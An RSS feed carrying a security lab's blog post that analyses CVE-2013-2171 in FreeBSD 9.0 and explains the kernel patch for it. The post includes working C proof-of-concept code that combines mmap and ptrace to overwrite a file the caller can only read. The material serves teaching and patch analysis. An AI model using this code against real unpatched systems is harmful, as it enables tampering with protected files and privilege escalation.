<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Portcullis Labs &#187; CVE-2013-2171</title>
	<atom:link href="https://labs.portcullis.co.uk/tag/cve-2013-2171/feed/" rel="self" type="application/rss+xml" />
	<link>https://labs.portcullis.co.uk</link>
	<description>Research and Development</description>
	<language>en-US</language>
		<sy:updatePeriod>hourly</sy:updatePeriod>
		<sy:updateFrequency>1</sy:updateFrequency>
	<generator>http://wordpress.org/?v=3.8.5</generator>
	<item>
		<title>In the lab, popping CVE-2013-2171 for FreeBSD 9.0&#8230;</title>
		<link>https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-2171-for-freebsd-9-0/</link>
		<comments>https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-2171-for-freebsd-9-0/#comments</comments>
		<pubDate>Wed, 11 Dec 2013 01:42:04 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[CVE-2013-2171]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[FreeBSD]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2554</guid>
		<description><![CDATA[<p>As a security researcher, I&#8217;m keen to learn new exploitation techniques and the art of kernel exploitation is no exception. Whilst preparing my slides for 44CON 2013, I was looking for an easy kernel vulnerability to demonstrate. CVE-2013-2171 was a recent vulnerability that was reported in FreeBSD 9.0 which fitted the bill. As I explained [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-2171-for-freebsd-9-0/">In the lab, popping CVE-2013-2171 for FreeBSD 9.0&#8230;</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>As a security researcher, I&#8217;m keen to learn new exploitation techniques and the art of kernel exploitation is no exception. Whilst preparing my slides for 44CON 2013, I was looking for an easy kernel vulnerability to demonstrate. <a title="CVE-2013-2171" href="http://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc">CVE-2013-2171</a> was a recent vulnerability that was reported in FreeBSD 9.0 which fitted the bill.<span id="more-2554"></span></p>
<p>As I explained in my talk, for a number of reasons, FreeBSD advisories are a great place to start learning about kernel exploitation:</p>
<ul>
<li>The source is freely available</li>
<li>It&#8217;s very readable</li>
<li>The FreeBSD Security Officer doesn&#8217;t hide the details of vulnerabilities unlike other vendors&#8217; security teams</li>
</ul>
<p>Anyway, let&#8217;s take a look at the bug in a bit more detail.</p>
<p>We start by taking a look at the description given in the advisory, which starts by talking about memory mapped files before stating that:</p>
<blockquote><p>
Due to insufficient permission checks in the virtual memory system, a tracing process (such as a debugger) may be able to modify portions of the traced process&#8217;s address space to which the traced process itself does not have write access.
</p></blockquote>
<p>Sounds interesting but how do we exploit it?</p>
<p>The first clue is in the reference to memory mapped files. For those of you that are unaware, on POSIX like systems, the <a href="http://pubs.opengroup.org/onlinepubs/009695399/functions/mmap.html" title="mmap">mmap()</a> function allows us to map the contents of a file (specified by a file descriptor) to an address which we can then access as if it&#8217;s a piece of physical RAM. Whilst clue two is in the reference to debuggers. The FreeBSD <a title="ptrace" href="http://www.freebsd.org/cgi/man.cgi?query=ptrace">ptrace()</a> function allows us to perform the PIOD_WRITE_D operation to write to the memory space of a process that has been traced.</p>
<p>Putting this all together, we end up with something like this:</p>
<pre class="brush: cpp; title: ; notranslate">
filehandle = open(&quot;/path/to/a/readable/file&quot;, 0, 0);
if ((mmapbuffer = (void *) mmap((void *) NULL, 1024, PROT_READ, MAP_SHARED, filehandle, 0)) == (void *) -1) {
	perror(&quot;mmap&quot;);
}
if ((childpid = fork()) == 0) {
	if (ptrace(PT_TRACE_ME, 0, NULL, 0)) {
		perror(&quot;PT_TRACE_ME&quot;);
		exit(EXIT_FAILURE);
	}
	sleep(60);
	exit(EXIT_SUCCESS);
} else {
	if (ptrace(PT_ATTACH, childpid, NULL, 0)) {
		perror(&quot;PT_ATTACH&quot;);
		exit(EXIT_FAILURE);
	}
	if (wait(0) == -1) {
		perror(&quot;wait&quot;);
		exit(EXIT_FAILURE);
	}	
	newbuffer = malloc(1024);
	memset(newbuffer, 'A', 1024);
	iodesc.piod_op = PIOD_WRITE_D;
	iodesc.piod_offs = mmapbuffer;
	iodesc.piod_addr = newbuffer;
	iodesc.piod_len = 1023;
	if (ptrace(PT_IO, childpid, (caddr_t) &amp;iodesc, sizeof(iodesc))) {
		perror(&quot;PT_IO&quot;);
		exit(EXIT_FAILURE);
	}
	free(newbuffer);
	if (munmap(newbuffer, 1024) == -1) {
		perror(&quot;munmap&quot;);
	}
	if (ptrace(PT_DETACH, childpid, NULL, 0)) {
		perror(&quot;PT_DETACH&quot;);
		exit(EXIT_FAILURE);
	}
	close(filehandle);
	exit(EXIT_SUCCESS);
}
</pre>
<p>As you can see, this opens a readable file and writes 1024 As to it.</p>
<p>But wait, why does this even work?</p>
<p>The <a href="http://svnweb.freebsd.org/base/stable/9/sys/vm/vm_map.c?r1=251901&#038;r2=251902&#038;pathrev=251902" title="patch">patch</a> supplied by the FreeBSD project adds an additional check to vm_map_lookup() which essentially returns KERN_PROTECTION_FAILURE if we&#8217;re trying to copy-on-read, and the page isn&#8217;t writable and the page isn&#8217;t marked as copy-on-write like so:</p>
<pre class="brush: cpp; first-line: 3802; title: ; notranslate">
if ((fault_typea &amp; VM_PROT_COPY) != 0 &amp;&amp;
	(entry-&gt;max_protection &amp; VM_PROT_WRITE) == 0 &amp;&amp;
		(entry-&gt;eflags &amp; MAP_ENTRY_COW) == 0) {
			vm_map_unlock_read(map);
				return (KERN_PROTECTION_FAILURE);
		}
</pre>
<p>It turns out that it works for the same reason that we can insert breakpoints into text segments of a running process even though they&#8217;re typically mapped as read-executable. Essentially, the kernel handles writes by ptrace() and it can bypass the permissions on the page since it runs with privileges beyond those of a userland process. The fix implemented by the FreeBSD project is simply to deny attempts to copy the page if it&#8217;s not actually writable. Debugging will continue to work after the patch has been applied, since for those segments, the pages will be marked as copy-on-write, something that isn&#8217;t the case for mmap()&#8217;d files.</p>
<p>The post <a href="https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-2171-for-freebsd-9-0/">In the lab, popping CVE-2013-2171 for FreeBSD 9.0&#8230;</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-2171-for-freebsd-9-0/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
	</channel>
</rss>
